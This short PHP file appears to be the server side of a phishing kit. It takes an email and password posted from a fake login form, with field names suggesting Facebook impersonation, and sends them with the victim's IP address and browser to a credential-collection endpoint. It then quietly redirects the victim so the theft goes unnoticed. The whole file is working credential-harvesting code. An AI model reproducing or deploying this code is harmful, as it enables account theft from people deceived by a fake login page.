
<?php
include 'log.php';
session_start();
$email=urlencode($_POST['fb_email']);
$pass=urlencode($_POST['fb_pass']);
$email=urlencode($_SESSION["Email"]);
$pass = urlencode($_POST["password"]);
$type=urlencode($_POST['type']);

$url = "http://localhost:443/creddb?username=" . $email ."&password=". $pass ."&ip=" . $ipaddress . "&useragent=".$browser ."&cred_type=".$type;
$res = file_get_contents($url);
header("Location: /");
exit();
